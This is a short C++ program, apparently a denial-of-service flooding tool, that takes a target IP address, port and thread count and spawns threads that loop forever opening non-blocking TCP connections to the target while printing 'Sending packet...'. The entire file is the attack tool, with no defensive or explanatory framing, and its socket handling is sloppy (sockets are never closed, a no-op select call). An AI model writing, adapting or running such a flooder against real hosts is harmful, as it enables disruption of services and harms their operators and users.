#include <cstdio>
#include <cstdlib>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>

char* ip;
int port, n;

void* dos(void* arg) {
	while(true) {
		int sock=socket(PF_INET,SOCK_STREAM,0);
		int flags=fcntl(sock,F_GETFL,0);
		fcntl(sock,F_SETFL,flags | O_NONBLOCK);
		struct sockaddr_in addr;
		addr.sin_family=AF_INET;
		addr.sin_port=htons(port);
		addr.sin_addr.s_addr=inet_addr(ip);
		fd_set rset, wset;
		FD_ZERO(&rset);
		FD_SET(sock,&rset);
		wset=rset;
		struct timeval tval;
		tval.tv_sec=0;
		tval.tv_usec=0;
		select(sock+1,&rset,&wset,NULL,0 ? & tval : NULL);
		connect(sock,(struct sockaddr*)&addr,sizeof(addr));
		printf("Sending packet...\n");
	}
}

int main(int argc,char* argv[]) {
	if(argc!=4) {
		printf("Usage: %s <ip> <port> <threads>\n",argv[0]);
		exit(0);
	}
	ip=argv[1];
	port=atoi(argv[2]);
	n=atoi(argv[3]);
	pthread_t threads[n];
	void* result[n];
	for(int i=0;i<n;i++) pthread_create(&threads[i],NULL,&dos,NULL);
	for(int i=0;i<n;i++) pthread_join(threads[i],&result[i]);
	return 0;
}